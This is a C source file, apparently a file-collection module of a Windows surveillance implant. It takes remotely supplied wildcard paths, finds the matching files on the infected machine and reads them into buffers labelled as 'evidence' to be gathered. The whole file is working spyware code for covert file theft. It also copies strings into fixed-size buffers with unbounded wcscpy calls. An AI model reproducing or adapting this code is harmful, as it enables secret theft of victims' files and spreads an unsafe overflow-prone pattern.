#include <Windows.h>
#include <stdio.h>
#include "proto.h"
#include "zmem.h"
#include "filesystem.h"
#include "globals.h"



DOWNLOAD_LOGS lpDownloadLogs[MAX_FILESYSTEM_QUEUE];


BOOL QueueDownloadLog(__in LPWSTR strFileName, __in LPWSTR strDisplayName)
{
	if (!strFileName || !strDisplayName)
		return FALSE;

	for (DWORD i=0; i<MAX_FILESYSTEM_QUEUE; i++)
	{
		if (lpDownloadLogs[i].strFileName == 0 || lpDownloadLogs[i].strFileName == NULL)
		{
			lpDownloadLogs[i].strFileName = wcsdup(strFileName);
			lpDownloadLogs[i].strDisplayName = wcsdup(strDisplayName);

			return TRUE;
		}
	}

	return FALSE;
}

// Se in wildpath e' presente una wildcard la sosituisce con file_name
// e mette comunque tutto in dest_path.
// Torna dest_path.
LPWSTR CompleteWildPath(LPWSTR strWildPath, LPWSTR strFileName, LPWSTR strDestPath)
{
	LPWSTR strWildPtr;
	
	strDestPath[0] = 0; // Termina per sicurezza paranoica...
	wcscpy(strDestPath, strWildPath);
	strWildPtr = wcsrchr(strDestPath, L'\\');
	
	// Sostituisce all'ultimo slash
	if (strWildPtr) 
	{
		strWildPtr++;
		wcscpy(strWildPtr, strFileName);
	}

	return strDestPath;
}

BOOL DownloadHandler(DWORD dwMsgLen, DWORD dwNumFile, LPBYTE lpFileBuffer)
{
	WCHAR path_expand_complete[MAX_PATH*2];
	WCHAR path_expand_display[MAX_PATH*2];

	if (!bCollectEvidences)
		return FALSE;

	for (DWORD i=0; i<dwNumFile; i++)
	{
		WCHAR strExpandedFile[MAX_PATH+1];

		if (ExpandEnvironmentStrings((LPWSTR)&lpFileBuffer[4], strExpandedFile, MAX_PATH))
		{
			WIN32_FIND_DATA pFindData;
			HANDLE hFind = FindFirstFile(strExpandedFile, &pFindData);
			if (hFind != INVALID_HANDLE_VALUE)
			{
				do
				{
					if (pFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
						continue;

					CompleteWildPath(strExpandedFile, pFindData.cFileName, path_expand_complete);
					CompleteWildPath((LPWSTR)&lpFileBuffer[4], pFindData.cFileName, path_expand_display);

					QueueDownloadLog(path_expand_complete, path_expand_display);
				}
				while (FindNextFile(hFind, &pFindData));
				FindClose(hFind);

				lpFileBuffer += sizeof(DWORD);
				lpFileBuffer += wcslen((LPWSTR)lpFileBuffer) * sizeof(WCHAR);
				lpFileBuffer += sizeof(WCHAR);
			}
		}
	}

	return TRUE;
}


LPBYTE DownloadGetEvidence(LPWSTR strFileName, LPWSTR strDisplayName, LPBYTE *lpHeader, LPDWORD dwHeaderSize, LPDWORD dwFileSize)
{
	FileAdditionalData pFileAdditionalData;

	if (!strFileName)
		return NULL;

	HANDLE hFile = CreateFile(strFileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return NULL;

	DWORD dwFileSizeHi;
	DWORD dwFileSizeLow = GetFileSize(hFile, &dwFileSizeHi);

	if (dwFileSizeLow == INVALID_FILE_SIZE || dwFileSizeHi > 0)
	{
		CloseHandle(hFile);
		return NULL;
	}

	DWORD dwRead;
	LPBYTE lpFileBuffer = (LPBYTE) zalloc(dwFileSizeLow);
	if (!lpFileBuffer)
		return FALSE;

	if (!ReadFile(hFile, lpFileBuffer, dwFileSizeLow, &dwRead, NULL))
	{
		CloseHandle(hFile);
		zfree(lpFileBuffer);
		return NULL;
	}
	CloseHandle(hFile);

	pFileAdditionalData.uVersion = LOG_FILE_VERSION;
	pFileAdditionalData.uFileNameLen = (wcslen(strFileName) + 1) * sizeof(WCHAR);

	*dwHeaderSize = sizeof(FileAdditionalData) + pFileAdditionalData.uFileNameLen;
	*lpHeader = (LPBYTE) zalloc(*dwHeaderSize);
	memcpy(*lpHeader, &pFileAdditionalData, sizeof(FileAdditionalData));
	memcpy((*lpHeader)+sizeof(FileAdditionalData), strFileName, (wcslen(strFileName) + 1) * sizeof(WCHAR));


	*dwFileSize = dwFileSizeLow;
	return lpFileBuffer;
	/*
	*dwEvSize = sizeof(FileAdditionalData) + pFileAdditionalData.uFileNameLen + dwFileSizeLow;
	LPBYTE lpBuffer = (LPBYTE) zalloc(*dwEvSize);
	if (!lpBuffer)
	{
		zfree(lpFileBuffer);
		return NULL;
	}

	LPBYTE lpBufferPtr = lpBuffer;
	memcpy(lpBufferPtr, &pFileAdditionalData, sizeof(FileAdditionalData));
	lpBufferPtr += sizeof(FileAdditionalData);

	memcpy(lpBufferPtr, strFileName, pFileAdditionalData.uFileNameLen);
	lpBufferPtr += pFileAdditionalData.uFileNameLen;

	memcpy(lpBufferPtr, lpFileBuffer, dwFileSizeLow); 

	zfree(lpFileBuffer);
	return lpBuffer;
	*/
}